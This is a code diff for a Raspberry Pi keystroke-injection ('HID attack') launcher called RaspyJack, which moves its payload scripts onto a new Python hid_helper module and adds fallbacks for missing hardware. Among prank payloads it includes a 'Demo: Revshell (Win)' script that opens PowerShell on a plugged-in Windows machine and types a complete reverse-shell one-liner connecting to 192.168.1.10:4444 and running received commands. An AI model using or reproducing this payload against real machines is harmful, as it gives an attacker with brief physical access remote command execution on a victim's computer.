@@ -19,9 +19,16 @@ import os, sys, subprocess, signal, time
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 
 # ---------------------------- Third‑party libs ----------------------------
-import RPi.GPIO as GPIO
-import LCD_1in44, LCD_Config
-from PIL import Image, ImageDraw, ImageFont
+try:
+    import RPi.GPIO as GPIO
+    import LCD_1in44, LCD_Config
+    from PIL import Image, ImageDraw, ImageFont
+    HARDWARE_LIBS_AVAILABLE = True
+except ImportError:
+    HARDWARE_LIBS_AVAILABLE = False
+    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)
+
+from hid_helper import hid_helper # Import the new HID helper
 
 # ---------------------------------------------------------------------------
 # 1) GPIO mapping (BCM)
@@ -34,41 +41,62 @@ PINS: dict[str, int] = {
 # ---------------------------------------------------------------------------
 # 2) GPIO & LCD initialisation
 # ---------------------------------------------------------------------------
-GPIO.setmode(GPIO.BCM)
-for pin in PINS.values():
-    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+if HARDWARE_LIBS_AVAILABLE:
+    GPIO.setmode(GPIO.BCM)
+    for pin in PINS.values():
+        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
 
-LCD = LCD_1in44.LCD()
-LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
-WIDTH, HEIGHT = 128, 128
-FONT = ImageFont.load_default()
-FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
+    LCD = LCD_1in44.LCD()
+    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
+    WIDTH, HEIGHT = 128, 128
+    FONT = ImageFont.load_default()
+    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
+else:
+    # Dummy objects if hardware libs are not available
+    class DummyLCD:
+        def LCD_Init(self, *args): pass
+        def LCD_Clear(self): pass
+        def LCD_ShowImage(self, *args): pass
+    LCD = DummyLCD()
+    class DummyGPIO:
+        def setmode(self, *args): pass
+        def setup(self, *args): pass
+        def input(self, pin): return 1 # Simulate no button pressed
+        def cleanup(self): pass
+    GPIO = DummyGPIO()
+    class DummyImageFont:
+        def truetype(self, *args, **kwargs): return None
+        def load_default(self): return None
+    ImageFont = DummyImageFont()
+    FONT_TITLE = ImageFont.load_default() # Fallback to default font
+    FONT = ImageFont.load_default() # Fallback to default font
 
 # ---------------------------------------------------------------------------
-# 3) HID Attack Scripts (P4wnP1 DuckyScript format)
+# 3) HID Attack Scripts (Python-native format for hid_helper)
 # ---------------------------------------------------------------------------
-# Note: These are formatted for a US keyboard layout by default.
+# Each script is a list of tuples: (command, arg1, arg2, ...)
+# Commands: 'type', 'press', 'modifier_key', 'delay'
 HID_SCRIPTS = {
     "Test: Hello World": [
-        'GUI r', 'delay(500)',
-        'type("notepad")', 'press("ENTER")', 'delay(1000)',
-        'type("Hello from RaspyJack!")'
+        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.r), ('delay', 0.5),
+        ('type', "notepad"), ('press', hid_helper.keyboard.enter), ('delay', 1.0),
+        ('type', "Hello from RaspyJack!")
     ],
     "Prank: Rickroll": [
-        'GUI r', 'delay(500)',
-        'type("https://www.youtube.com/watch?v=dQw4w9WgXcQ")', 'press("ENTER")'
+        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.r), ('delay', 0.5),
+        ('type', "https://www.youtube.com/watch?v=dQw4w9WgXcQ"), ('press', hid_helper.keyboard.enter)
     ],
     "Demo: Revshell (Win)": [
-        'GUI r', 'delay(500)',
-        'type("powershell")', 'press("ENTER")', 'delay(1000)',
-        'type("powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient(\'192.168.1.10\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"')",
-        'press("ENTER")'
+        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.r), ('delay', 0.5),
+        ('type', "powershell"), ('press', hid_helper.keyboard.enter), ('delay', 1.0),
+        ('type', "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),
+        ('press', hid_helper.keyboard.enter)
     ],
     "Demo: macOS Popup": [
-        'GUI SPACE', 'delay(500)',
-        'type("Terminal")', 'press("ENTER")', 'delay(1000)',
-        'type(\'osascript -e \\'display dialog "Hello from RaspyJack!" with icon 1 buttons {"OK"} default button "OK"\\'\')',
-        'press("ENTER")'
+        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.space), ('delay', 0.5), # Cmd+Space for Spotlight
+        ('type', "Terminal"), ('press', hid_helper.keyboard.enter), ('delay', 1.0),
+        ('type', 'osascript -e \'display dialog "Hello from RaspyJack!" with icon 1 buttons {"OK"} default button "OK"\''),
+        ('press', hid_helper.keyboard.enter)
     ]
 }
 SCRIPT_NAMES = list(HID_SCRIPTS.keys())
@@ -91,21 +119,32 @@ signal.signal(signal.SIGTERM, cleanup)
 # ---------------------------------------------------------------------------
 
 def run_hid_attack(script_name: str):
-    """Executes a HID script using P4wnP1_cli."""
-    script_lines = HID_SCRIPTS.get(script_name)
-    if not script_lines:
+    """Executes a HID script using hid_helper."""
+    script_actions = HID_SCRIPTS.get(script_name)
+    if not script_actions:
         return False
 
-    # The script is a list of commands. We join them with semicolons.
-    full_script = '; '.join(script_lines)
-    
-    # The P4wnP1_cli expects the script to be quoted.
-    command = f"P4wnP1_cli hid job -c '{full_script}'"
-    
+    if not hid_helper.is_hid_gadget_enabled:
+        print("ERROR: HID Gadget not enabled. Cannot run HID attack.", file=sys.stderr)
+        return False
+
     try:
-        subprocess.run(command, shell=True, check=True, timeout=60)
+        for action in script_actions:
+            cmd = action[0]
+            args = action[1:]
+
+            if cmd == 'type':
+                hid_helper.type_string(args[0])
+            elif cmd == 'press':
+                hid_helper.press_key(args[0])
+            elif cmd == 'modifier_key':
+                hid_helper.press_modifier_key(args[0], args[1])
+            elif cmd == 'delay':
+                time.sleep(args[0])
+            else:
+                print(f"WARNING: Unknown HID action: {cmd}", file=sys.stderr)
         return True
-    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as e:
+    except Exception as e:
         print(f"Error running HID attack: {e}", file=sys.stderr)
         return False
 
@@ -115,6 +154,10 @@ def run_hid_attack(script_name: str):
 
 def draw_menu(selected_index: int):
     """Draws the attack selection menu."""
+    if not HARDWARE_LIBS_AVAILABLE:
+        print("ERROR: Hardware libs not available. Cannot draw menu.", file=sys.stderr)
+        return
+
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
     d = ImageDraw.Draw(img)
     
@@ -136,6 +179,10 @@ def draw_menu(selected_index: int):
 
 def draw_status(message: str, color: str = "yellow"):
     """Draws a status message on the screen."""
+    if not HARDWARE_LIBS_AVAILABLE:
+        print(f"STATUS: {message}", file=sys.stderr)
+        return
+
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
     d = ImageDraw.Draw(img)
     bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
@@ -149,14 +196,17 @@ def draw_status(message: str, color: str = "yellow"):
 # 7) Main Loop
 # ---------------------------------------------------------------------------
 try:
+    if not HARDWARE_LIBS_AVAILABLE:
+        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Launcher.", file=sys.stderr)
+        sys.exit(1)
+
+    if not hid_helper.is_hid_gadget_enabled:
+        draw_status("HID Gadget NOT\nenabled! See\nupdate_deps.py", "red")
+        time.sleep(5)
+        sys.exit(1)
+
     selected_index = 0
     
-    # Check for P4wnP1_cli
-    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
-        draw_status("P4wnP1_cli not found!", "red")
-        time.sleep(5)
-        raise SystemExit("P4wnP1_cli not found")
-
     while running:
         draw_menu(selected_index)
         
@@ -195,6 +245,7 @@ except Exception as e:
     draw_status(f"ERROR:\n{str(e)[:20]}", "red")
     time.sleep(3)
 finally:
-    LCD.LCD_Clear()
-    GPIO.cleanup()
+    if HARDWARE_LIBS_AVAILABLE:
+        LCD.LCD_Clear()
+        GPIO.cleanup()
     print("HID Attack payload finished.")
